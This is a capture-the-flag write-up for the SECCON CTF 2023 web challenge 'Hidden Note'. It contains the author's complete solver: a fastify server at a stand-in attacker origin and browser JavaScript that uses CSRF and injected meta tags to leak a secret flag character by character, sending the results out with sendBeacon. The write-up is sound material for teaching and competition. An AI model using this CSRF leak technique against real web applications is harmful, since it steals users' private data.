---
title: "Hidden Note - SECCON CTF 2023 Quals"
category: "web"
subcategory: "csrf"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "csrf", "hidden", "note", "web", "seccon-ctf-2023-quals"]
summary: "Shared pages hide your secret notes."
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/web/hidden-note"
license: "none stated"
ctf:
  name: "SECCON CTF 2023 Quals"
  year: 2023
  challenge: "Hidden Note"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/web/hidden-note>
- **CTF:** SECCON CTF 2023 Quals

---

# [web] hidden-note

## Description

Shared pages hide your secret notes.

- Challenge: `http://hidden-note.seccon.games:3000`
- Admin bot: `http://hidden-note.seccon.games:1337`

## Attachments

- [hidden-note](files/hidden-note)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e WEB_BASE_URL=http://localhost:3000 \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e ATTACKER_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/web/hidden-note/solver/index.js>

```javascript
const fastify = require("fastify")();
const path = require("node:path");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const WEB_BASE_URL = process.env.WEB_BASE_URL ?? fail("No WEB_BASE_URL");
const BOT_BASE_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");
const PORT = "8080";

if (!ATTACKER_BASE_URL.startsWith("http://")) {
  fail("Invalid ATTACKER_BASE_URL: the CSRF will fail");
}

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  let sharedUrl;

  fastify.register(require("@fastify/static"), {
    root: path.join(__dirname, "public"),
  });

  fastify.get("/set-referer", async (req, reply) => {
    const url = new URL(req.headers["referer"]);
    sharedUrl = `${WEB_BASE_URL}${url.pathname}`;
    return "";
  });

  fastify.get("/get-note-ids", async (req, reply) => {
    while (!sharedUrl) {
      await sleep(30);
    }
    const html = await fetch(sharedUrl).then((r) => r.text());
    sharedUrl = undefined;

    const ids = [...html.matchAll(/"\/notes\/delete\/(?<id>[0-9a-f]+)"/g)].map(
      (m) => m.groups["id"]
    );
    return ids;
  });

  let known = "SECCON{";

  fastify.post("/leaked", async (req, reply) => {
    known = req.body.trim();
    console.log(known);
    return "";
  });

  fastify.post("/flag", async (req, reply) => {
    // You got a flag!
    console.log("Flag:", req.body);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    await sleep(3 * 1000);
    for (let i = 0; i < 2; i++) {
      console.log(`Report ${i + 1}:`);
      await reportUrl(
        `${ATTACKER_BASE_URL}?${new URLSearchParams({
          baseUrl: "http://web:3000",
          known,
        })}`
      );
    }

    fail("Failed");
  });
};
start();
```


## Solver: `main.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/web/hidden-note/solver/public/main.js>

```javascript
const BASE_URL = new URLSearchParams(location.search).get("baseUrl");
const KNOWN = new URLSearchParams(location.search).get("known");
const CHARS = "}_abcdefghijklmnopqrstuvwxyz0123456789";

const sleep = async (msec) => new Promise((r) => setTimeout(r, msec));

const createNote = (content) => {
  const form = document.getElementById("createNote");
  form.content.value = content;
  form.submit();
};

const getNoteIds = async (query) => {
  const win = open(`${BASE_URL}/share?${new URLSearchParams({ query })}`);
  const ids = await fetch(`${location.origin}/get-note-ids`).then((r) =>
    r.json()
  );
  win.close();
  return ids;
};

const leak = async (known) => {
  const droppedKnown = known.slice(1);
  // known.includes("SECCON"); // -> true
  // droppedKnown.includes("SECCON"); // -> false

  const redirectedUrl = `${location.origin}/set-referer`;

  const prefix =
    "^" + ["@", ...CHARS].map((c) => droppedKnown + c).join("|") + "$";

  createNote(`${prefix}<meta name="referrer" content="unsafe-url">`);
  await sleep(100);
  createNote(
    `${prefix}<meta http-equiv="Refresh" content="0; URL=${redirectedUrl}">`
  );
  await sleep(100);

  const N = 12;
  for (let i = 0; i < N - 2; i++) {
    createNote(prefix);
    await sleep(100);
  }

  const ngNoteIds = await getNoteIds(droppedKnown + "@");
  for (const c of CHARS) {
    const noteIds = await getNoteIds(droppedKnown + c);
    if (JSON.stringify(noteIds) !== JSON.stringify(ngNoteIds)) {
      return c;
    }
  }
  throw "Failed";
};

const main = async () => {
  const innerHtml = `
    <form id="createNote" action="${BASE_URL}/notes/new" method="post" target="createNote">
      <input type="text" name="content">
    </form>
  `;
  document.body.innerHTML += innerHtml;

  let known = KNOWN;
  while (!known.endsWith("}")) {
    known += await leak(known);
    navigator.sendBeacon(`${location.origin}/leaked`, known);
  }
  navigator.sendBeacon(`${location.origin}/flag`, known);
};
main();
```
